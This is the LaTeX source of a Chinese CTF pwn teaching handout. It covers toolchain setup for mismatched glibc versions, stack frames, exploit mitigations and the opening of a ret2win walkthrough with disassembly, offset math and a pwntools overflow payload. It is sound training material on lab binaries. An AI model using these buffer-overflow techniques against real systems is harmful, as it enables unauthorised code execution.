% =====================================================================
%  CTF Pwn 教學講義  --  從 ret2win 打進 Heap Exploitation
%  編譯： xelatex main.tex  (跑兩次，第二次才有正確目錄)
% =====================================================================
\documentclass[11pt,a4paper,fontset=none]{ctexart}

\usepackage{fontspec}
\setmonofont{JetBrains Mono}[Scale=0.85]
\setCJKmainfont{Noto Serif CJK TC}
\setCJKsansfont{Noto Sans CJK TC}
\setCJKmonofont{Noto Sans Mono CJK TC}

\usepackage[a4paper,top=2.3cm,bottom=2.3cm,left=2.1cm,right=2.1cm]{geometry}
\usepackage{xcolor}
\usepackage{listings}
\usepackage[most]{tcolorbox}
\usepackage{booktabs}
\usepackage{array}
\usepackage{longtable}
\usepackage{enumitem}
\usepackage{fancyhdr}
\usepackage{tikz}
\usetikzlibrary{arrows.meta,positioning,shapes.geometric,calc,fit,backgrounds}
\usepackage{amsmath,amssymb}
\usepackage[colorlinks=true,linkcolor=blue!55!black,urlcolor=blue!55!black,
            citecolor=blue!55!black,bookmarksnumbered=true]{hyperref}

% ---------- 顏色 ----------
\definecolor{codebg}{RGB}{247,247,249}
\definecolor{codeframe}{RGB}{205,205,215}
\definecolor{kw}{RGB}{0,90,170}
\definecolor{cmt}{RGB}{35,130,80}
\definecolor{str}{RGB}{190,80,0}
\definecolor{hl}{RGB}{225,240,255}
\definecolor{warnbg}{RGB}{255,246,230}
\definecolor{warnfr}{RGB}{230,150,40}
\definecolor{keybg}{RGB}{235,247,240}
\definecolor{keyfr}{RGB}{40,160,100}
\definecolor{whybg}{RGB}{240,242,255}
\definecolor{whyfr}{RGB}{90,110,220}

% ---------- 程式碼樣式 ----------
\lstdefinestyle{base}{
  basicstyle=\ttfamily\footnotesize,
  commentstyle=\color{cmt}\itshape,
  keywordstyle=\color{kw}\bfseries,
  stringstyle=\color{str},
  numberstyle=\tiny\color{gray},
  numbers=left, numbersep=7pt,
  breaklines=true, breakatwhitespace=false,
  frame=single, rulecolor=\color{codeframe},
  backgroundcolor=\color{codebg},
  showstringspaces=false, tabsize=4, upquote=true,
  columns=fullflexible, keepspaces=true,
  xleftmargin=18pt, framexleftmargin=18pt,
  aboveskip=8pt, belowskip=8pt,
  literate={→}{{$\rightarrow$}}1 {≫}{{$\gg$}}1 {─}{{-}}1
}
\lstdefinestyle{py}{style=base,language=Python}
\lstdefinestyle{c}{style=base,language=C}
\lstdefinestyle{sh}{style=base,language=bash,numbers=none,xleftmargin=10pt,framexleftmargin=10pt}
\lstdefinestyle{asm}{style=base,language={[x86masm]Assembler}}
\lstdefinestyle{raw}{style=base,numbers=none,xleftmargin=10pt,framexleftmargin=10pt}
\lstdefinestyle{pyfile}{style=py,numbers=left}

\lstset{style=base}

% ---------- 提示框 ----------
\newtcolorbox{keybox}[1][重點]{
  enhanced,breakable,colback=keybg,colframe=keyfr,
  fonttitle=\bfseries\sffamily,title={\faIcon\ #1},
  boxrule=0.8pt,left=6pt,right=6pt,top=5pt,bottom=5pt,
  arc=2pt, attach boxed title to top left={xshift=8pt,yshift=-2pt},
  boxed title style={colback=keyfr,colframe=keyfr,arc=2pt},
  }
\newtcolorbox{warnbox}[1][陷阱]{
  enhanced,breakable,colback=warnbg,colframe=warnfr,
  fonttitle=\bfseries\sffamily,title={#1},
  boxrule=0.8pt,left=6pt,right=6pt,top=5pt,bottom=5pt,arc=2pt,
  attach boxed title to top left={xshift=8pt,yshift=-2pt},
  boxed title style={colback=warnfr,colframe=warnfr,arc=2pt},
  }
\newtcolorbox{whybox}[1][為什麼]{
  enhanced,breakable,colback=whybg,colframe=whyfr,
  fonttitle=\bfseries\sffamily,title={#1},
  boxrule=0.8pt,left=6pt,right=6pt,top=5pt,bottom=5pt,arc=2pt,
  attach boxed title to top left={xshift=8pt,yshift=-2pt},
  boxed title style={colback=whyfr,colframe=whyfr,arc=2pt},
  }
\newcommand{\faIcon}{}

% ---------- 版面 ----------
\pagestyle{fancy}
\fancyhf{}
\fancyhead[L]{\small\sffamily CTF Pwn 教學講義}
\fancyhead[R]{\small\sffamily\leftmark}
\fancyfoot[C]{\small\thepage}
\renewcommand{\headrulewidth}{0.4pt}
\renewcommand{\contentsname}{目錄}
\renewcommand{\refname}{參考資料}
\setlength{\headheight}{13pt}
\setlength{\parskip}{0.35em}
\setlength{\parindent}{0pt}
\linespread{1.12}

% \code{} 要能直接吃 identifier 與運算符，不必手寫 \_ \^ 等：
% 讓 _ ^ & # 在參數被 tokenize 之前就變成普通字元（catcode 12）。
% 這些都是「tokenize 時」才生效的 catcode，所以在 \code 展開後、
% 讀取參數之前改掉，就來得及。注意 % 不能這樣搞 —— TeX 讀入整行時
% 就依當下的 catcode 砍掉註解，比 \code 展開還早，所以 % 一律寫成 \%。
%
% \codebrk 額外做兩件事：
%   1. 把空白換成 \c_space_tl —— expl3 的 mapping 會「吃掉」空白，
%      不換的話 \code{return address} 會印成 "returnaddress"。
%   2. 在每個字元後面插 \allowbreak，讓長識別字（例如
%      malloc_consolidate）可以在行尾斷開。否則 \texttt 是
%      不可斷的方塊，長一點就會 Overfull \hbox 凸出邊界。
\ExplSyntaxOn
\cs_new_protected:Npn \codebrk #1
  {
    \tl_set:Nn \l_tmpa_tl {#1}
    \tl_replace_all:Nnn \l_tmpa_tl { ~ } { \c_space_tl }
    \tl_map_inline:Nn \l_tmpa_tl { ##1 \allowbreak }
  }
\ExplSyntaxOff

\makeatletter
\def\code{\begingroup\catcode`\_=12 \catcode`\^=12 \catcode`\&=12
           \catcode`\#=12 \code@a}
\def\code@a#1{\texttt{\color{kw!80!black}\codebrk{#1}}\endgroup}
\makeatother
\newcommand{\addr}[1]{\texttt{#1}}
\newcommand{\file}[1]{\texttt{#1}}

\title{\bfseries CTF Pwn 教學講義\\[4pt]
       \large 從 ret2win 打進 Heap Exploitation\\[10pt]
       \normalsize\normalfont 五題完整解法 + 觀念拆解}
\author{}
\date{}

\begin{document}

\begin{titlepage}
\centering
\vspace*{3.2cm}
{\Huge\bfseries\sffamily CTF Pwn 教學講義\par}
\vspace{10pt}
{\LARGE\sffamily 從 ret2win 打進 Heap Exploitation\par}
\vspace{6pt}
{\large\sffamily 五題完整解法 $\cdot$ 觀念從零拆解\par}
\vspace{28pt}
{\large\sffamily 涵蓋題目\par}
\vspace{8pt}
{\large
\begin{tabular}{ll}
\toprule
\textbf{題目} & \textbf{主題}\\
\midrule
1. ret2win          & 堆疊溢位、控 return address\\
2. weakness         & ret2win 變化、找 offset\\
3. soul-archive-thanos & UAF、type confusion、PIE leak\\
4. soul-vault-collector & UAF、偽造物件、洩漏沒有 \%p 的 PIE\\
5. house-of-water   & UAF、tcache poisoning、讀 heap 上的 flag\\
\bottomrule
\end{tabular}\par}
\vspace{34pt}
{\large\sffamily 附加：一條真的 ROP chain 實作\par}
\vfill
{\small\sffamily 本講義所有腳本皆已實際執行並取得 flag\par}
\end{titlepage}

\pagenumbering{roman}
\tableofcontents
\newpage
\pagenumbering{arabic}

\section{開始之前：環境與工具}

這一章沒有講漏洞，但它是整份講義最實用的一章。原因很簡單：\textbf{pwn 題目有九成的挫折感來自環境不對}，
而不是你觀念不會。你在後面幾章會看到，這五題裡面有一題（house-of-water）的難點根本不是漏洞，
而是題目附的 loader 與 libc 版本不一致。

\subsection{你需要準備什麼}

\begin{longtable}{@{}p{3.5cm}p{11.5cm}@{}}
\toprule
\textbf{工具} & \textbf{用途與安裝}\\
\midrule
\endhead
\code{python3} + \code{pwntools} &
  所有腳本的骨架。\code{pip install --user pwntools}。
  \code{process()} 起程式、\code{remote()} 連遠端、\code{p64()} 打包位址、\code{u64()} 解位址。\\
\code{gdb} + \code{pwndbg}/\code{gef} &
  看 heap 佈局、看 stack、單步。本講義會用 \code{x/8gx} 這種指令直接讀記憶體。\\
\code{ROPgadget} &
  掃 gadget，例如 \code{pop rdi ; ret}。\code{pip install --user ROPgadget}。\\
\code{checksec} &
  看防禦機制。pwntools 內建：\code{ELF(path).checksec()}，不必另外裝。\\
\code{patchelf} &
  改 ELF 的 interpreter 與 rpath，讓題目用指定的 libc 跑。\\
\code{objdump} / \code{readelf} &
  逆組語、看節區與符號表。\code{objdump -d -M intel} 是人看的格式。\\
\bottomrule
\end{longtable}

\begin{keybox}[本講義的起手式]
每一題都從這三件事開始：
\begin{enumerate}[leftmargin=1.4em,itemsep=1pt]
  \item \code{checksec}：有沒有 canary / PIE / NX / RELRO。
  \item 找 \code{main}：看它呼叫了什麼、flag 怎麼被印出來、有沒有 \code{gets}/\code{read} 這種不限長度的輸入。
  \item 找「目標」：能把 \code{rip} 指到哪一個函式？還是要拿到 shell？
\end{enumerate}
\end{keybox}

\subsection{五個防禦機制速查}

這張表請記牢，後面每一題都會用到。

\begin{longtable}{@{}p{2.6cm}p{12.4cm}@{}}
\toprule
\textbf{機制} & \textbf{它在防什麼、你看到它要怎麼想}\\
\midrule
\endhead
Canary &
  在 return address 前面塞一個隨機值（\code{fs:0x28}）。函式返回前檢查有沒有被改。
  有的話就 \code{*** stack smashing detected ***} 然後 abort。
  $\Rightarrow$ 想 overflow 就必須\textbf{先洩漏 canary 再原封不動塞回去}，或改打 heap。\\
PIE &
  Position Independent Executable。程式碼被載入到\textbf{隨機基底}，你逆出來的 \code{0x125e} 實際位址是
  \code{base + 0x125e}。 $\Rightarrow$ 必須先 leak 一個程式碼位址，算出 \code{base}。\\
ASLR &
  核心層級的隨機化。把 stack、heap、libc、PIE 的基底都隨機化。
  \textbf{注意：heap 基底與 PIE 基底是各自獨立的}（見 \ref{sec:heap-pie-independent}）。\\
NX &
  Non-eXecutable。stack / heap 標成不可執行。$\Rightarrow$ 把 shellcode 塞進 buffer 再跳過去行不通，
  要改用 \textbf{ROP}（第 \ref{chap:rop} 章）。\\
RELRO &
  Relocation Read-Only。Full RELRO 會把 GOT 在載入後設成唯讀。
  $\Rightarrow$ 不能改 GOT，但 heap 攻擊通常也不需要。\\
SHSTK / IBT (CET) &
  Intel CET 的硬體防護。ELF 上只是一個 \emph{屬性位元}，
  \textbf{核心沒有真的啟用時完全沒有作用}。本系列的五題都沒啟用，
  所以可以跳進沒有 \code{endbr64} 的位址。\\
\bottomrule
\end{longtable}

\begin{warnbox}[checksec 的 SHSTK/IBT 常常是嚇人的]
本系列每一題 \code{checksec} 都寫 \code{SHSTK: Enabled, IBT: Enabled}，
但實際上直接跳到 \code{system@plt+4}（沒有 \code{endbr64} 的位置）也照跑。
判斷方式是：\emph{先試}，真的 SIGSEGV 在 \code{endbr64} 相關位址再處理。
\end{warnbox}

\subsection{第一步：看防禦機制}

\begin{lstlisting}[style=py]
from pwn import *
elf = ELF('chal', checksec=False)   # checksec=False 先不要印，避免雜訊
print(elf.checksec())
\end{lstlisting}

\begin{lstlisting}[style=raw]
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
\end{lstlisting}

看到 \code{Canary found} + \code{PIE enabled}，就幾乎可以斷定：
\textbf{這題不是「覆蓋 return address」的題型，而是 heap 題}。
這五題裡面有兩題（ret2win、weakness）是 \code{No canary found} + \code{No PIE}，
另外三題都是 canary + PIE $\rightarrow$ 全部走 heap。

\subsection{踩雷實錄：題目附的 ld 跟 libc 版本不一致}
\label{sec:toolchain}

這一段請務必看完。它花掉的心力比三題漏洞加起來還多。

\subsubsection{症狀}

題目壓縮檔裡通常會附上它用的 \file{libc.so.6} 與 \file{ld-linux-x86-64.so.2}，
用意是「請用這一份 libc 跑，這樣位址偏移才會一致」。
所以標準做法是：

\begin{lstlisting}[style=sh]
patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . ./chal --output chal_patched
./chal_patched
\end{lstlisting}

這次跑出來的結果是：

\begin{lstlisting}[style=raw]
*** stack smashing detected ***: terminated
\end{lstlisting}

\textbf{還沒輸入任何東西就爆 canary}。這不是你的漏洞打錯，是環境壞了。

\subsubsection{診斷}

分別問 libc 與 ld 自己的版本：

\begin{lstlisting}[style=sh]
$ strings -a libc.so.6 | grep "GNU C Library"
GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.15) stable release version 2.35.

$ ./ld-linux-x86-64.so.2 --version
ld.so (Ubuntu GLIBC 2.39-0ubuntu8.8) stable release version 2.39.
\end{lstlisting}

\begin{warnbox}[一句話總結這個雷]
\file{ld.so} 與 \file{libc.so.6} \textbf{必須是同一版 glibc}。
題目把 2.35 的 libc 跟 2.39 的 loader 包在一起，兩者對 TLS（canary 就放在 TLS 裡）、
符號版本、內部結構的認知不同，於是程式一啟動 canary 檢查就失敗。
\end{warnbox}

\begin{whybox}[為什麼 canary 會壞掉？]
glibc 的 stack canary 存在 TLS（thread-local storage）裡，而 \textbf{TLS 的佈局是 loader 決定的}。
2.35 的 libc 假設 canary 在 TLS 的某個位置，2.39 的 loader 卻把它放在另一個位置，
於是 libc 初始化時讀到錯誤的值，函式返回時一檢查就「被竄改」。
換句話說：\textbf{版本不符 = 一啟動就死，跟你的 exploit 完全無關}。
\end{whybox}

\subsubsection{解法：自己湊一組版本一致的 toolchain}

要拿到 2.35 的 loader，最直接的方式是抓對應版本的 Ubuntu 套件：

\begin{lstlisting}[style=sh]
# 1. 下載跟題目 libc 同版本的 libc6 deb
wget http://archive.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.35-0ubuntu3.15_amd64.deb

# 2. 解開（放進一個自己的空目錄，不要跟題目檔案混在一起）
mkdir -p /tmp/deb && dpkg-deb -x libc6_2.35-0ubuntu3.15_amd64.deb /tmp/deb

# 3. 組出 toolchain 目錄
mkdir -p toolchain
cp /tmp/deb/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2  toolchain/ld-2.35.so
cp /tmp/deb/lib/x86_64-linux-gnu/libc.so.6             toolchain/libc.so.6
\end{lstlisting}

\begin{keybox}[一定要驗證 libc 一模一樣]
不要只是「版本號看起來一樣」就相信，直接比對雜湊：

\begin{lstlisting}[style=sh]
$ md5sum 題目附的/libc.so.6 toolchain/libc.so.6
dc315a923a7f751910a9f3a8ecac61c6  題目附的/libc.so.6
dc315a923a7f751910a9f3a8ecac61c6  toolchain/libc.so.6     <-- 一致，安心
\end{lstlisting}
\end{keybox}

接著用這組 toolchain 重新 patch：

\begin{lstlisting}[style=sh]
patchelf --set-interpreter /abs/path/toolchain/ld-2.35.so \
         --set-rpath       /abs/path/toolchain \
         ./chal --output ./chal_patched
./chal_patched        # 應該要正常印出選單
\end{lstlisting}

\begin{warnbox}[兩個小細節]
\begin{itemize}[leftmargin=1.4em,itemsep=1pt]
  \item \textbf{一定要用絕對路徑}。用相對路徑時，只要你換個目錄執行就會找不到 loader 或 libc。
  \item \code{--set-rpath} 要指向\textbf{裝著 libc.so.6 的那個目錄}，
        這樣 loader 就知道要去哪裡找它要配對的 libc。
\end{itemize}
\end{warnbox}

驗證成功的話，直接執行會看到選單：

\begin{lstlisting}[style=raw]
1) malloc
2) free
3) edit
4) show
5) exit
>
\end{lstlisting}

\begin{keybox}[一句話心法]
\textbf{先讓程式「乾淨地跑起來」，再開始想漏洞。}
如果連選單都印不出來，你 debug 的對象是環境，不是你的 exploit。
\end{keybox}

\subsection{每一題的固定開場}

\begin{lstlisting}[style=py]
import os, re, sys
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

ROOT = '/abs/path/to/pwn'                 # 一律絕對路徑，避免 cwd 被改掉
BIN  = os.path.join(ROOT, 'solve/vault/soul_vault_patched')
elf  = ELF(BIN, checksec=False)

def start():
    if args.REMOTE:                        # python3 exp.py REMOTE HOST=... PORT=...
        return remote(args.HOST or 'localhost', int(args.PORT or 1337))
    return process(BIN, cwd=os.path.dirname(BIN))   # cwd = 題目目錄（flag 檔在那）
\end{lstlisting}

\begin{keybox}[\code{cwd} 很重要]
\code{process(BIN, cwd=...)} 讓子行程在題目目錄裡執行。
很多題目的 flag 是 \code{./flag.txt}，工作目錄不對就會「拿到 shell 卻 cat 不到 flag」。
\end{keybox}

\section{基礎：程式在記憶體裡長什麼樣}

這一章的每一個觀念，後面五題都會用到。如果你只懂 ret2win，這一章會把「為什麼能打」講清楚；
如果你要打 heap，這一章的 stack 圖仍然是最重要的對照組。

\subsection{x86-64 的呼叫約定（System V ABI）}

\begin{longtable}{@{}p{3.2cm}p{11.8cm}@{}}
\toprule
\textbf{東西} & \textbf{規定}\\
\midrule
\endhead
參數傳遞 &
  前六個整數/指標參數放在 \code{rdi, rsi, rdx, rcx, r8, r9}，之後才堆到 stack。
  回傳值放 \code{rax}。\\
\code{rsp} & stack pointer，指向 stack 最頂端（\textbf{位址最小}的那一端）。\\
\code{rbp} & frame pointer，指向目前這個函式的 frame 底部，區域變數用 \code{rbp-0x??} 定址。\\
\code{rip} & 下一條要執行的指令。\textbf{控制它就控制流程}。\\
\code{call} & 把下一條指令的位址（return address）push 到 stack，然後跳過去。\\
\code{ret} & 從 stack 彈出 8 bytes 丟進 \code{rip}。\\
對齊 & 在\textbf{執行 \code{call} 之前}，\code{rsp} 必須是 16 的倍數；
  所以進入一個函式時（\code{call} 剛 push 完），\code{rsp} 會是 $16n+8$。\\
\bottomrule
\end{longtable}

\subsection{Stack frame：一個函式的長相}

編譯器（\code{-O0}）對每個函式都套同一個模板：

\begin{lstlisting}[style=asm]
函式開頭 (prologue)          函式結尾 (epilogue)
  push rbp                     leave      ; = mov rsp,rbp ; pop rbp
  mov  rbp, rsp                ret        ; = pop rip
  sub  rsp, 0x40               (先把 rbp 還原，再彈出 return address)
  ... 區域變數在 rbp-0x40 ...
\end{lstlisting}

畫成圖就是這樣（位址由下往上增加）：

\begin{center}
\begin{tikzpicture}[font=\ttfamily\small,node distance=1pt]
  \node[draw,fill=orange!15,minimum width=7.4cm,minimum height=0.62cm] (ret)
       {return address \hfill \textcolor{gray}{$\leftarrow$ \code{ret} 會 pop 這個進 rip}};
  \node[draw,fill=blue!12,minimum width=7.4cm,minimum height=0.62cm,below=of ret] (rbp)
       {saved rbp（呼叫者的 rbp）\hfill \textcolor{gray}{$\leftarrow$ \code{rbp} 指這裡}};
  \node[draw,fill=green!12,minimum width=7.4cm,minimum height=1.5cm,below=of rbp] (buf)
       {區域變數 / 緩衝區 \quad(\code{rbp-0x40} \dots\ \code{rbp-0x01})
        \hfill \textcolor{gray}{$\leftarrow$ \code{rsp}}};
  \node[left=6pt of buf,font=\ttfamily\scriptsize,text=gray] {低位址};
  \node[left=6pt of ret,font=\ttfamily\scriptsize,text=gray] {高位址};
  \draw[->,thick,red] ($(ret.north west)+(-0.9,0)$) -- ($(ret.south west)+(-0.9,0)$);
\end{tikzpicture}
\end{center}

\begin{keybox}[這張圖就是 pwn 的全部起點]
\code{buf} 的大小是 \code{0x40}。如果你能\textbf{寫超過 0x40 個 byte}，
就會依序蓋掉：saved rbp（+0x40 到 +0x47），再來是 return address（+0x48 到 +0x4f）。
所以「offset 到 return address」的公式是：

\[
\boxed{\text{offset} = \text{buffer 大小} + 8}
\]

那個 \code{+8} 就是 saved rbp。ret2win 這題 buffer 是 \code{0xa} bytes，
所以 offset $= 0xa + 8 = 18$。
\end{keybox}

\subsection{為什麼 overflow 就能控制 rip}

因為 \code{ret} 是「從 \code{rsp} 指的地方 pop 8 bytes 丟進 \code{rip}」——
而你剛剛把 return address 蓋掉了。於是函式要返回時，\code{rip} 就變成你寫的值。

\begin{center}
\begin{tikzpicture}[font=\ttfamily\small,node distance=1pt]
  \node[draw,fill=orange!15,minimum width=6.6cm,minimum height=0.6cm] (r1)
       {return address = 你寫的值};
  \node[draw,fill=blue!12,minimum width=6.6cm,minimum height=0.6cm,below=of r1] (b1)
       {rbp = AAAAAAAA};
  \node[draw,fill=green!12,minimum width=6.6cm,minimum height=1.4cm,below=of b1] (c1)
       {buffer = AAAA\dots AAAA};
  \node[draw,fill=orange!15,minimum width=6.6cm,minimum height=0.6cm,right=1.6cm of r1] (r2)
       {return address = \code{win()}};
  \node[draw,fill=blue!12,minimum width=6.6cm,minimum height=0.6cm,below=of r2] (b2)
       {rbp = AAAAAAAA};
  \node[draw,fill=green!12,minimum width=6.6cm,minimum height=1.4cm,below=of b2] (c2)
       {buffer = AAAA\dots AAAA};
  \draw[->,very thick] ($(c1.east)+(0.3,0.8)$) -- node[above,font=\sffamily\scriptsize]{overflow} ($(c2.west)+(-0.3,0.8)$);
\end{tikzpicture}
\end{center}

\subsection{怎麼找 offset？三種方法}

\begin{enumerate}[leftmargin=1.5em,itemsep=3pt]
  \item \textbf{看組語（最準）}：找 \code{gets}/\code{read} 的參數是從哪個 \code{rbp-0x??} 開始。
        ret2win 的 \code{hello}：
\begin{lstlisting}[style=asm]
401220:  lea    rax,[rbp-0xa]     ; <-- buffer 在 rbp-0xa
401224:  mov    rdi,rax
40122c:  call   4010d0 <gets@plt>
\end{lstlisting}
        $\Rightarrow$ buffer $= \code{0xa}$，offset $= \code{0xa}+8=\code{18}$。

  \item \textbf{cyclic pattern（最快）}：送一串不重複的字串，看 \code{rip} 變成哪四個字母。
\begin{lstlisting}[style=py]
io.sendline(cyclic(200))
io.wait()
core = io.corefile                 # 或 gdb 看 SIGSEGV 時的 rip
print(cyclic_find(core.read(core.rsp, 4)))   # -> offset
\end{lstlisting}

  \item \textbf{gdb}：在 \code{ret} 上下斷點，看 \code{rsp} 與 buffer 差多少。
        \code{pwndbg} 的 \code{cyclic -l} 也可以反向查。
\end{enumerate}

\subsection{再深入一點：每個防禦機制實際上在做什麼}

\subsubsection{Canary}

\begin{lstlisting}[style=asm]
; prologue
mov  rax, qword ptr fs:0x28    ; 從 TLS 讀出 canary
mov  qword ptr [rbp-0x8], rax  ; 放在 buffer 和 return address 中間
; epilogue
mov  rdx, qword ptr [rbp-0x8]
sub  rdx, qword ptr fs:0x28    ; 有沒有被改？
jne  __stack_chk_fail
\end{lstlisting}

\begin{warnbox}[canary 的最後一個 byte 一定是 \code{0x00}]
這是刻意的：讓 \code{printf("\%s")} 之類的字串輸出「遇到 canary 就停」，
避免不小心洩漏。想 leak canary 時記得，只要覆蓋到它的第一個 byte 就會壞。
\end{warnbox}

\subsubsection{PIE 與 leak}

PIE 只是把所有程式碼位址加上一個隨機的 \code{base}。所以：

\[
\code{實際位址} = \code{base} + \code{檔案內 offset}
\]

只要你 leak 到\textbf{任何一個程式碼位址}，就能反推 \code{base}。
例如 soul-archive 題目會直接印 \code{Inspect Callback: 0x55...3a9}，
而 \code{inspect_human} 的檔案內 offset 是 \code{0x13a9}，於是 \code{base = leak - 0x13a9}。

\begin{keybox}[判斷 leak 對不對]
PIE \code{base} \textbf{一定是 page 對齊}（結尾是 \code{000}）。
算出來不是 \code{0x...000} 就是 offset 猜錯了。
\end{keybox}

\subsubsection{ASLR：heap 基底和 PIE 基底沒有關係}
\label{sec:heap-pie-independent}

這一點非常重要，因為它會直接決定 soul-vault 那題怎麼打。很多人以為
「leak 到 heap $\Rightarrow$ 可以推出 PIE」，\textbf{錯}。

Linux 對 PIE 與 brk（heap）使用不同的隨機化：heap 的起點由 \code{arch_randomize_brk()} 決定，
和 PIE 的 \code{base} 完全獨立。實測 soul-vault 連續跑六次，記錄 PIE 基底與 heap 基底的差：

\begin{lstlisting}[style=raw]
pie=0x55f9edfeb000 heap=0x55fa060a1000  delta=0x180b6000
pie=0x55eea261a000 heap=0x55eeaa58f000  delta=0x7f75000
pie=0x55735016e000 heap=0x55738d069000  delta=0x3cefb000
pie=0x55b8dd90f000 heap=0x55b913f99000  delta=0x3668a000
pie=0x56280fc1c000 heap=0x56282c794000  delta=0x1cb78000
pie=0x55b87131f000 heap=0x55b8af28e000  delta=0x3df6f000
\end{lstlisting}

差值每次都不一樣（最大到 32 MB）。結論：

\begin{whybox}[所以 soul-vault 的真正難點]
題目本身\textbf{完全沒有任何 \code{\%p}}，也就是沒有任何現成的位址洩漏。
你 leak 得到 heap（heap 上的 \code{fd} 就是位址），但\textbf{推不出 PIE}，
而 \code{stone_state} 這些全域變數都在 PIE 的 \code{.bss} 裡。
第 \ref{chap:vault} 章會示範怎麼在不認識任何 PIE 位址的情況下，
硬是從 heap 上「挖」出一個程式碼位址——那是這五題裡最漂亮的一段。
\end{whybox}

\subsubsection{NX 與 ROP}

NX 讓 stack 不能執行，所以你不能把 shellcode 放進 buffer 再跳過去。替代方案是
\textbf{return-oriented programming}：不注入程式碼，而是\textbf{串接程式裡本來就有的小片段}。
第 \ref{chap:rop} 章會從零開始講。

\subsubsection{RELRO 與 GOT}

\begin{longtable}{@{}p{3.4cm}p{11.6cm}@{}}
\toprule
\textbf{種類} & \textbf{差別}\\
\midrule
Partial RELRO & GOT 可寫。傳統攻擊會改 GOT 讓某個函式指向 \code{system}。\\
Full RELRO &
  載入時就把所有符號解析完（\code{-z now}），然後 \code{mprotect} 把 GOT 設成唯讀。
  $\Rightarrow$ 改 GOT 行不通。\\
\bottomrule
\end{longtable}

這五題全部都是 Partial（ret2win、weakness）或 Full RELRO（三題 heap），
但我們的解法都不需要動 GOT。

\section{第一題：ret2win}
\label{chap:ret2win}

這是五題裡最簡單的一題，也是唯一一題你可以「純靠第二章的圖」就打完的。
它的名字 ret2win 就是字面意思：\textbf{return to win}——把 return address 改成 \code{win()}。

\subsection{題目給了什麼}

壓縮檔解出來是一個執行檔（本講義放在 \file{work/ret2win/main.out}）與一個 \file{flag.txt}。
先看防禦機制：

\begin{lstlisting}[style=raw]
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
\end{lstlisting}

\begin{keybox}[這四行直接決定打法]
\begin{itemize}[leftmargin=1.4em,itemsep=1pt]
  \item \textbf{No canary} $\Rightarrow$ 可以放心 overflow，蓋掉 return address 不會被檢查。
  \item \textbf{No PIE} $\Rightarrow$ 程式碼位址是固定的（\code{0x400000} 起算），
        你可以\textbf{直接把寫死的位址}填進 payload，不需要先 leak。
  \item NX enabled $\Rightarrow$ 不能放 shellcode。但這題也不需要——目標函式就在程式裡。
\end{itemize}
\end{keybox}

\subsection{逆一下：程式只有三件事}

\begin{lstlisting}[style=asm]
00000000004012f0 <main>:
  4012fd:  call   4011f6 <hello>
\end{lstlisting}

\code{main} 什麼都沒做，只呼叫 \code{hello}。而 \code{hello} 是這樣：

\begin{lstlisting}[style=asm]
00000000004011f6 <hello>:
  4011f6:  endbr64
  4011fa:  push   rbp
  4011fb:  mov    rbp,rsp
  4011fe:  sub    rsp,0x10
  401202:  lea    rax,[rip+0xdff]        # 402008  "Hi, what's your name?"
  40120c:  call   4010a0 <puts@plt>
  401220:  lea    rax,[rbp-0xa]          ; <=== buffer 在這裡！
  401224:  mov    rdi,rax
  40122c:  call   4010d0 <gets@plt>      ; <=== 不限長度的輸入
  401231:  lea    rax,[rbp-0xa]
  401242:  call   4010b0 <printf@plt>    ; printf("Hello, %s!", buf)
  40125c:  leave
  40125d:  ret
\end{lstlisting}

看到 \code{gets} 就等於看到「這題可以溢位」。\code{gets} 沒有長度上限，
你送多少它就寫多少，而它就寫在 \code{rbp-0xa} 這個只有 10 bytes 的地方。

再來找「目標」。程式裡有一個從來沒被呼叫的函式：

\begin{lstlisting}[style=asm]
000000000040125e <win>:
  40126a:  lea    rax,[rip+0xdb9]   # "r"        -> 40202a
  401274:  lea    rax,[rip+0xdb1]   # "flag.txt" -> 40202c
  40127e:  call   4010f0 <fopen@plt>            ; fopen("flag.txt", "r")
  4012ab:  lea    rax,[rbp-0x50]
  4012b4:  mov    rdi,rax
  4012b7:  call   4010c0 <fgets@plt>            ; fgets(buf, 0x40, fp)
  4012c3:  lea    rax,[rip+0xdb7]   # "Hello, %s!" 之類的格式
  4012d2:  call   4010b0 <printf@plt>           ; 印出 flag
\end{lstlisting}

\begin{keybox}[一句話定義 ret2win]
「目標函式已經寫好在程式裡了，我只要讓 \code{rip} 跳過去就好。」
不需要 shellcode、不需要 leak、不需要 ROP——所以它是最適合入門的一題。
\end{keybox}

\subsection{三個關鍵數字}

\begin{longtable}{@{}p{4.2cm}p{10.8cm}@{}}
\toprule
\textbf{數字} & \textbf{怎麼來的}\\
\midrule
\endhead
\code{win = 0x40125e} &
  符號表直接查（\code{ELF(BIN).symbols['win']}），No PIE 所以就是最終位址。\\
\code{buffer = 0xa} &
  \code{lea rax,[rbp-0xa]}：從 \code{rbp} 往回算 10 bytes。\\
\code{offset = 0x12} &
  \code{buffer + 8} $= 0xa + 8 = 18$。那個 8 是 saved \code{rbp}（第二章的公式）。\\
\bottomrule
\end{longtable}

\subsection{offset 為什麼是 buffer + 8}

回憶第二章那張圖：\code{gets} 從 \code{rbp-0xa} 開始往\textbf{高位址}寫。
所以它依序會蓋到：

\[
\underbrace{\text{buf[0..9]}}_{10\ \text{bytes}}
\quad\underbrace{\text{saved rbp}}_{8\ \text{bytes}}
\quad\underbrace{\text{return address}}_{8\ \text{bytes}}
\]

你要「碰得到」return address，就必須先填滿 10 bytes 的 buffer，再填滿 8 bytes 的 saved rbp，
總共 $10 + 8 = 18$ bytes 之後，才是 return address 的起點。

\begin{warnbox}[最常見的兩個錯]
\begin{itemize}[leftmargin=1.4em,itemsep=1pt]
  \item 只填 10 bytes 就接位址 $\Rightarrow$ 你的位址只蓋到 saved rbp，程式「正常」返回，什麼都沒發生。
  \item 忘記算 buffer 之外還有別的區域變數 $\Rightarrow$ offset 偏小。
        這題很單純（只有一個 buffer），但後面幾題會有陣列＋索引，要更小心。
\end{itemize}
\end{warnbox}

\subsection{組出 payload}

\begin{lstlisting}[style=py]
OFFSET = 0xa + 8            # 18
payload  = b'A' * OFFSET    # 填滿 buffer + saved rbp
payload += p64(RET)         # 對齊用的 ret（下一節解釋）
payload += p64(WIN)         # win() 的位址，會被 ret 彈進 rip
\end{lstlisting}

\code{p64()} 把一個 64-bit 整數打包成 8 bytes 小端序。
